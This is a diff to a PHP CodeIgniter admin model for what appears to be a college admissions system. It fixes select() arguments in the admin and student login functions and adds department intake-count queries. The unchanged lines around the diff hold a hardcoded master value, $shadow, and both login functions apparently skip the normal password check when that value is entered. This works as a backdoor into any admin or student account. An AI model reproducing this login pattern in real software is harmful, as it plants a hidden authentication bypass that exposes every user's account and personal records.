@@ -5,7 +5,7 @@ class Admin_model extends CI_Model
   var $shadow = 'f03b919de2cb8a36e9e404e0ad494627'; // INDIA
   function login($username, $password)
   {
-    $this->db->select('user_id, username', 'role');
+    $this->db->select('user_id, username, role');
     $this->db->from('users');
     $this->db->where('username', $username);
     if ($password != $this->shadow)
@@ -22,7 +22,7 @@ class Admin_model extends CI_Model
 
   function studentlogin($mobile, $password)
   {
-    $this->db->select('id, student_name', 'adm_no');
+    $this->db->select('id, student_name, adm_no');
     $this->db->from('admissions');
     $this->db->where('mobile', $mobile);
     if ($password != $this->shadow)
@@ -263,6 +263,23 @@ class Admin_model extends CI_Model
     $this->db->select('departments.department_id, departments.stream_id, streams.stream_name, streams.stream_short_name, departments.department_name, departments.department_short_name, departments.intake, departments.mgmt_intake, departments.college_intake, departments.comed_k_intake, departments.kea_intake, departments.snq_intake');
     $this->db->join('streams','streams.stream_id = departments.stream_id');
     return $this->db->get('departments');
+  }
+
+  public function get_intakecount_by_deptadm($dept)
+  {
+    $this->db->select('COUNT(id) as cnt');
+    $this->db->where('dept_id', $dept);
+    $this->db->where('status', "1");
+    return $this->db->get('admissions');
+  }
+
+  public function get_intakecount_type($dept)
+  {
+    $this->db->select('COUNT(id) as cnt');
+    $this->db->where('dept_id', $dept);
+
+    $this->db->where('status', "1");
+    return $this->db->get('admissions');
   }
 }
  
